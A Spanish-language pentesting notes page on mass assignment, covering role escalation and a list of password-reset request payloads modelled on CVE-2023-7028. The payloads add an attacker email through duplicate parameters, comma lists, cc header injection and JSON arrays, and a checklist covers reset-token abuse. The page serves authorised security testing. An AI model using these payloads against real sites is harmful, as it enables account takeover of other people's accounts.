---
title: Mass Assignment
sidebar_position: 1
---

## ¿Qué es?

Basicamente añadir un dato extra que no se manda por defecto en el app. O sea ponle que se manda `user` y `password`, pero hay un dato en el back que acepta `role` entonces le agregas ese `role` y le pones un valor `admin` por ejemplo y te haces admin.

La neta hay muchos ejemplos sea cual sea el tema que andas viendo ando actualizando lit todo constantemente. Pero ahí van algunos que me acuerdo.

## Reset password 

- Ver como se esta mandando
- Cambiar el correo

```bash
AQUI VER SI PODEMOS CONCATENAR OTRO EMAIL POR EJEMPLO

[+] PETICION ORIGINAL
POST /reset-password

user=test

[+] PETICION MODIFICADA (PONGO 1,2,3 para las posibles tecnicas)

POST /reset-password

INTENTAR
1 user=test&email=attacker@gmail.com
2 user=test@gmail.com,attacker@gmail.com
3 user=test@gmail.com, cc:attacker@gmail.com
4 user=test@gmail.com\ncc:attacker@gmail.com (Traten de encodear el \n por si acaso)
5 user=test&email=test@gmail.com,attacker@gmail.com
6 user=test&email=test@gmail.com, cc:attacker@gmail.com
7 user=test&email=test@gmail.com\ncc:attacker@gmail.com
8 CAMBIAR EL CONTENT TYPE A JSON
	{"email":['correo1','correo2']}
9 user=test&email=test@gmail.com&email=attacker@gmail.com
```

Esto basado en lo que paso en gitlab: https://github.com/Vozec/CVE-2023-7028

- Ver si el USER A puede usar el token del USER B (Para esto solicitar el reset password para ambos)
- Reciclar Tokens
- Modificar tokens
- Ver si hay logs o algo que guarde los reset tokens xdd 
- Ver respuestas
- Algun path donde se pueda usar ese reset token

